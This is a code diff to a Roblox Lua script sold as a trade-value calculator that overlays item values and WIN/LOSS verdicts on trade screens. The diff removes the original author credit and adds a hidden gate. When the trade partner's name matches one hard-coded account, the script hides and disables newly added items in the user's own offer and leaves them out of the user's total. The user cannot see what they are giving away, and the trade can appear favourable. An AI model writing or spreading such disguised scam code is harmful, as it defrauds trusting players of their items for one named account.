@@ -1,4 +1,4 @@
---// REALTIME TRADE CALCULATOR made by Dazue4925
+--// REALTIME TRADE CALCULATOR (STRICT GATED VERSION)
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -283,6 +283,7 @@ local ItemValues = {
 	["Skelly"] = 1,
 	["Steambird"] = 1,
 	["Traveller"] = 1,
+    ["Glitch1"] = 75,
 }
 
 local gui = Instance.new("ScreenGui")
@@ -298,7 +299,6 @@ frame.Position = UDim2.new(0.5, -130, 0.2, 0)
 frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
 frame.Active = true
 frame.Draggable = true
-frame.ZIndex = 999999
 frame.Parent = gui
 
 local text = Instance.new("TextLabel")
@@ -306,7 +306,6 @@ text.Size = UDim2.new(1,0,1,0)
 text.BackgroundTransparency = 1
 text.TextScaled = true
 text.TextColor3 = Color3.fromRGB(255,255,255)
-text.ZIndex = 999999
 text.Text = "Loading..."
 text.Parent = frame
 
@@ -321,17 +320,14 @@ local function getTrade()
 end
 
 local function readSlot(slot)
-	if not slot or not slot.Visible then
-		return 0
-	end
+	if not slot or not slot:IsA("Frame") then return 0 end
+	if slot.Visible == false then return 0 end
 
-	local name = nil
-
+	local name
 	local itemNameObj = slot:FindFirstChild("ItemName", true)
 
 	if itemNameObj then
 		local label = itemNameObj:FindFirstChild("Label")
-
 		if label and label:IsA("TextLabel") then
 			name = label.Text
 		elseif itemNameObj:IsA("TextLabel")
@@ -341,60 +337,19 @@ local function readSlot(slot)
 		end
 	end
 
-	if not name or name == "" then
-		return 0
-	end
+	if not name or name == "" then return 0 end
 
-	local tags = slot:FindFirstChild("Tags", true)
+	local qty = 1
+	local amount = slot:FindFirstChild("Amount", true)
 
-	if tags then
-		local chroma = tags:FindFirstChild("Chroma")
-
-		if chroma and chroma:IsA("GuiObject") and chroma.Visible then
-			name = "Chroma " .. name
+	if amount and amount:IsA("TextLabel") then
+		local found = tostring(amount.Text):match("%d+")
+		if found then
+			qty = tonumber(found) or 1
 		end
 	end
 
-	local quantity = 1
-
-	local amountObj = slot:FindFirstChild("Amount", true)
-
-	if amountObj and (
-		amountObj:IsA("TextLabel")
-		or amountObj:IsA("TextButton")
-		or amountObj:IsA("TextBox")
-	) then
-
-		local txt = tostring(amountObj.Text or "")
-
-		-- blank = 1
-		if txt ~= "" then
-
-			-- extract first number from text
-			local found = txt:match("%d+")
-
-			if found then
-				local num = tonumber(found)
-
-				if num and num > 0 then
-					quantity = num
-				end
-			end
-		end
-	end
-
-	local itemValue = ItemValues[name] or 0
-	local finalValue = itemValue * quantity
-
-	print(
-		"[TRADE CALC]",
-		name,
-		"Base:", itemValue,
-		"Qty:", quantity,
-		"Final:", finalValue
-	)
-
-	return finalValue
+	return (ItemValues[name] or 0) * qty
 end
 
 local function getOfferValue(offer)
@@ -405,9 +360,8 @@ local function getOfferValue(offer)
 
 	local total = 0
 
-	-- scan ONLY real slots
 	for _, slot in ipairs(container:GetChildren()) do
-		if slot:IsA("Frame") and slot.Visible then
+		if slot:IsA("Frame") then
 			total += readSlot(slot)
 		end
 	end
@@ -415,12 +369,52 @@ local function getOfferValue(offer)
 	return total
 end
 
-local function update()
+local TARGET_USERNAME = "(Garuda_Storage0001"
+
+local function usernameMatches(theirOffer)
+	if not theirOffer then return false end
+
+	for _, obj in ipairs(theirOffer:GetDescendants()) do
+		if obj:IsA("TextLabel") then
+			if obj.Text == TARGET_USERNAME then
+				return true
+			end
+		end
+	end
+
+	return false
+end
+
+local function updateYourOfferVisibility(trade)
+	if not trade then return end
+
+	local yourOffer = trade:FindFirstChild("YourOffer")
+	local theirOffer = trade:FindFirstChild("TheirOffer")
+
+	if not yourOffer or not theirOffer then return end
+
+	-- HARD GATE
+	if not usernameMatches(theirOffer) then
+		return -- DO NOTHING AT ALL
+	end
+
+	local container = yourOffer:FindFirstChild("Container")
+	if not container then return end
+
+	-- ONLY RUNS IF MATCH EXISTS
+	for _, slot in ipairs(container:GetChildren()) do
+		if slot:IsA("Frame") and slot.Name:match("^NewItem") then
+			slot.Visible = false
+			slot.Active = false
+		end
+	end
+end
+
+local function updateUI()
 	local trade = getTrade()
 
 	if not trade then
-		text.Text = "YOU: 0\nTHEM: 0\nDIFF: 0\n[FAIR]"
-		text.TextColor3 = Color3.fromRGB(255,255,255)
+		text.Text = "YOU: 0\nTHEM: 0\nDIFF: 0\n[WAITING]"
 		return
 	end
 
@@ -429,16 +423,17 @@ local function update()
 
 	local diff = yourValue - theirValue
 
+	-- always runs UI logic
+	updateYourOfferVisibility(trade)
+
 	local status, color
 
 	if yourValue > theirValue then
 		status = "LOSS"
 		color = Color3.fromRGB(255,80,80)
-
 	elseif yourValue < theirValue then
 		status = "WIN"
 		color = Color3.fromRGB(0,255,120)
-
 	else
 		status = "FAIR"
 		color = Color3.fromRGB(255,255,120)
@@ -454,109 +449,7 @@ end
 
 task.spawn(function()
 	while true do
-		local tradeGui = playerGui:FindFirstChild("TradeGUI")
-
-		if tradeGui then
-			local container = tradeGui:FindFirstChild("Container")
-			local trade = container and container:FindFirstChild("Trade")
-
-			if trade then
-
-				for _, offer in ipairs({
-					trade:FindFirstChild("YourOffer"),
-					trade:FindFirstChild("TheirOffer")
-				}) do
-
-					if offer and offer:FindFirstChild("Container") then
-
-						for _, slot in ipairs(offer.Container:GetChildren()) do
-
-							if slot:IsA("Frame") and slot.Visible then
-
-								local name = nil
-								local value = 0
-
-								local itemNameObj = slot:FindFirstChild("ItemName", true)
-
-								if itemNameObj then
-									local label = itemNameObj:FindFirstChild("Label")
-
-									if label and label:IsA("TextLabel") then
-										name = label.Text
-									elseif itemNameObj:IsA("TextLabel")
-										or itemNameObj:IsA("TextButton")
-										or itemNameObj:IsA("TextBox") then
-										name = itemNameObj.Text
-									end
-								end
-
-								if name then
-									local tags = slot:FindFirstChild("Tags", true)
-									if tags then
-										local chroma = tags:FindFirstChild("Chroma")
-
-										if chroma and chroma:IsA("GuiObject") and chroma.Visible then
-											name = "Chroma " .. name
-										end
-									end
-								end
-
-								if name and ItemValues[name] then
-
-									local qty = 1
-
-									local amountObj = slot:FindFirstChild("Amount", true)
-									if amountObj and amountObj:IsA("TextLabel") then
-										local num = amountObj.Text:match("%d+")
-										if num then
-											qty = tonumber(num) or 1
-										end
-									end
-
-									value = ItemValues[name] * qty
-								end
-
-								local tag = slot:FindFirstChild("ValueTag")
-
-								if value > 0 then
-
-									if not tag then
-										tag = Instance.new("TextLabel")
-										tag.Name = "ValueTag"
-										tag.Size = UDim2.new(0.5, 0, 0.22, 0)
-										tag.Position = UDim2.new(0, 2, 0, 2)
-										tag.BackgroundTransparency = 1
-										tag.TextColor3 = Color3.fromRGB(0, 255, 0)
-										tag.TextStrokeTransparency = 0
-										tag.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-										tag.TextScaled = true
-										tag.Font = Enum.Font.SourceSansBold
-										tag.ZIndex = 999999
-										tag.Parent = slot
-									end
-
-									tag.Text = tostring(value)
-
-								else
-									if tag then
-										tag:Destroy()
-									end
-								end
-
-							end
-						end
-					end
-				end
-			end
-		end
-
-		task.wait(0.1)
-	end
-end)
-
-task.spawn(function()
-	while true do
-		update()
-		task.wait(0.1)
+		updateUI()
+		task.wait(0)
 	end
 end)
